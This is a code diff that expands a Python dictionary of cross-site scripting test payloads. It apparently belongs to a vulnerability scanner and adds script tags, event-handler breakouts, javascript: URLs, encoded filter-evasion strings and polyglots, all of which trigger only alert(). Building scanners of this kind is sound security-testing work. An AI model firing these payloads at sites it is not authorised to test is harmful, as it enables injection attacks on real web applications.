@@ -4,19 +4,57 @@ from typing import Dict, List
 
 
 # XSS payloads organized by category
-# OPTIMIZED: Only most effective payloads for fast detection
 XSS_PAYLOADS: Dict[str, List[str]] = {
     "basic": [
-        "<script>alert(1)</script>",      # Classic script tag
-        "<img src=x onerror=alert(1)>",   # Image onerror
-        "<svg onload=alert(1)>",          # SVG onload
+        "<script>alert(1)</script>",
+        "<script>alert('XSS')</script>",
+        "<img src=x onerror=alert(1)>",
+        "<img src=x onerror=alert('XSS')>",
+        "<svg onload=alert(1)>",
+        "<svg onload=alert('XSS')>",
     ],
     "img": [
-        "<img src=x onerror=alert(1)>",   # Duplicate for form testing
+        "<img src=x onerror=alert(1)>",
+        "<img src=x onerror=alert('XSS')>",
+        "<img src=javascript:alert(1)>",
+        "<img src=javascript:alert('XSS')>",
+    ],
+    "svg": [
+        "<svg onload=alert(1)>",
+        "<svg onload=alert('XSS')>",
+        "<svg/onload=alert(1)>",
+        "<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
+    ],
+    "javascript": [
+        "javascript:alert(1)",
+        "javascript:alert('XSS')",
+        "javascript://%0aalert(1)",
+        "javascript://%0dalert(1)",
     ],
     "event_handlers": [
-        "\" onmouseover=alert(1) \"",      # Quote breakout
-        " onfocus=alert(1) autofocus ",   # Autofocus trick
+        "\" onmouseover=alert(1) \"",
+        "' onmouseover=alert(1) '",
+        " onfocus=alert(1) autofocus ",
+        " onerror=alert(1) ",
+        " onload=alert(1) ",
+    ],
+    "html_injection": [
+        "<body onload=alert(1)>",
+        "<iframe src=javascript:alert(1)>",
+        "<input onfocus=alert(1) autofocus>",
+        "<details open ontoggle=alert(1)>",
+        "<marquee onstart=alert(1)>",
+    ],
+    "encoded": [
+        "&lt;script&gt;alert(1)&lt;/script&gt;",
+        "%3Cscript%3Ealert(1)%3C/script%3E",
+        "<scr ipt>alert(1)</scr ipt>",
+        "<script >alert(1)</script >",
+    ],
+    "polyglots": [
+        "'\"><svg/onload=alert(1)>",
+        "'\"><img src=x onerror=alert(1)>",
+        "javascript://--></script></title></style>\"/'`--></svg></textarea><img src=x onerror=alert(1)//>",
     ]
 }
 
